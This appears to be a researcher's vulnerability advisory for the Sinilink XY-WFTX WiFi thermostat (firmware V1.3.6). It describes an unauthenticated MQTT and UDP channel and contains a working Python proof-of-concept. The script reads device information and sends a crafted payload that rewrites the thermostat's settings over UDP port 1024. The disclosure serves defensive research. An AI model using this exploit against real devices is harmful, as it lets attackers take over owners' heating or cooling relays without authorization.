# CVE-20XX-XXXXX - CWE-300: Channel Accessible by Non-Endpoint
# Sinilink XY-WFTX Wifi Remote Thermostat Module Temperature Controller

## Title

<img src="images/sinilinkglyph.png" alignment=center>

# Product Documentation

- [Application](http://www.sinilink.com/jumpShop.html)

- [User Manual](http://www.sinilink.com/ins/pdf/web/viewer.html?file=http://www.sinilink.com/ins/wifi/XY-WFTX/XY-WFTX-EN.pdf)

## Hardware

<img src="images/pic-1.jpg" height=60% width=60%>

<img src="images/pic-2.jpg" height=60% width=60%>

<img src="images/pic-3.jpg" height=60% width=60%>

<img src="images/pic-4.jpg" height=60% width=60%>

<img src="images/pic-5.jpg" height=60% width=60%>

## Datasheet(s)

[ESP8285](https://www.espressif.com/sites/default/files/documentation/0a-esp8285_datasheet_en.pdf)

[Buck Converter](https://datasheet.lcsc.com/lcsc/1809050422_XLSEMI-XL1509-5-0E1_C61063.pdf)

[Firmware](http://www.sinilink.com/download/gujian/WFTX-V1.3.6.bin)

## Product Description

```
Overview

WIFI Remote Thermostat High Precision Temperature Controller Module Cooling and Heating APP Temperature Collection XY-WFT1 WFTX

Technical Parameters


Temperature display: digital tube display
Supply voltage: DC 6~30V
USB power supply: support
Temperature control range: -40~110°C
Temperature control accuracy: 0.1℃
NTC temperature measurement range: -40~110℃
Whether to support 18B20: Yes (-40~110°℃)
Output type: relay switch, current within 10A
Alarm notification: support WeChat alarm notification
Cloud data record: 15 days cloud record, can be exported at any time
Timer switch function: support
```

## Reference

[MITRE]

[SpiderLabs Blog]

[Exploit-DB]

## Manufacturer

[Sinilink.com](https://sinilink.com)

## Research

- Product uses websockets to setup comms back to **ws://mq.sinilink.com:8085/mqtt**.
- This endpoint is utilised as a MQTT Broker and is unauthenticated

## Attack Surface Map

<img src="images/attacksurface.png">

## Finding

## Weakness Vulnerability

- CWE-300: Channel Accessible by Non-Endpoint

## Known Affected Software Configurations

- V1.3.6

### POC Code

```
#!/usr/local/bin/python3
# Author: Victor Hanna (SpiderLabs)
# Sinilink WiFi Remote Thermostat
# CWE-300: Channel Accessible by Non-Endpoint

import requests
import re
import urllib.parse
from colorama import init
from colorama import Fore, Back, Style
import sys
import os
import time
import socket
import time
from datetime import datetime

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Banner Function
def banner():
    print ("[+]********************************************************************************[+]")
    print ("|   Author : Victor Hanna (9lyph)["+Fore.RED + "SpiderLabs" +Style.RESET_ALL+"]\t\t\t\t\t    |")
    print ("|   Description: Sinilink WiFi Remote Thermostat                                    |")
    print ("|   Usage : "+sys.argv[0]+" <host>                                                     |")
    print ("[+]********************************************************************************[+]")

def retrieve_device_info():

    SinilinkMsgFromClient = "SINILINK521"
    host = str(sys.argv[1])
    try:
        bytesToSend = str.encode(SinilinkMsgFromClient)
        serverAddressPort = (""+host, 1024)
        bufferSize = 1024
        print (Fore.GREEN + "[+] Retrieving Device Information ..." + Style.RESET_ALL)
        UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        UDPClientSocket.sendto(bytesToSend, serverAddressPort)
        time.sleep(5)
        msgFromServer = UDPClientSocket.recvfrom(bufferSize)
        msg = "Message from Server {}".format(msgFromServer[0])
        MAC = msg[30:47] 
        dt = msg[56:66]
        converted = datetime.fromtimestamp(int(dt)).strftime("%A, %B %d, %Y %I:%M:%S")
        temp = msg[84:88]
        degree = msg[90:91]
        relay_value = msg[76:77]
        print (Fore.CYAN + f"    --> MAC Address: {MAC}" + Style.RESET_ALL)
        print (Fore.CYAN + f"    --> Time Stamp: {converted}" + Style.RESET_ALL)
        print (Fore.CYAN + f"    --> Current Temperature Reading: {temp}{degree}" + Style.RESET_ALL)
        if (relay_value == "1"):
            print (Fore.CYAN + f"    --> Relay State: Open" + Style.RESET_ALL)
        else:
            print (Fore.CYAN + f"    --> Relay State: Closed" + Style.RESET_ALL)
    except:
        print ("Unsuccessful")

def send_payload():
    try:
        epoch_time = str(int(time.time()))
        msgFromClient = 'PROWT4C:EB:D6:01:A8:7C{"MAC":"4C:EB:D6:01:A8:7C","time":'+epoch_time+',"param":[1,"M",0,20.8,"C","H",66,5,0,0,0,20.5,0,-40,0,0,5,1,0,0,0,0]}'
        bytesToSend = str.encode(msgFromClient)
        serverAddressPort = (""+host, 1024)
        bufferSize = 1024
        print (Fore.GREEN + "[+] Sending Payload ..." + Style.RESET_ALL)
        time.sleep(5)
        UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        UDPClientSocket.sendto(bytesToSend, serverAddressPort)
        time.sleep(15)
        # UDPClientSocket.close()
    except:
        print ("Unsuccesful")
    
# Main Function
def main():
    os.system('clear')
    banner()
    retrieve_device_info()
    send_payload()
    retrieve_device_info()



if __name__ == "__main__":
    if len(sys.argv)>1:
        host = sys.argv[1]
        main()
    else:
        print (Fore.RED + f"[+] Not enough arguments, please specify target and relay!" + Style.RESET_ALL)

```

## Remediation Steps

- Adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities. 

## Pwnage

<video src="https://user-images.githubusercontent.com/44860700/188859477-f09a8f08-a04e-484a-81fb-6206a53fff8f.mp4" data-canonical-src="https://user-images.githubusercontent.com/44860700/188859477-f09a8f08-a04e-484a-81fb-6206a53fff8f.mp4" controls="controls" muted="muted" class="d-block rounded-bottom-2 border-top width-fit" style="max-height:640px;"></video>

#### Discoverer/Credit: 




Victor Hanna of Trustwave SpiderLabs

#### Follow me on
[Twitter](https://twitter.com/9lyph) [Linkedin](https://www.linkedin.com/in/victor-h-a894a84/) [Youtube](https://www.youtube.com/channel/UC79Q2b0tHeqsjjvEH0k7jZw)
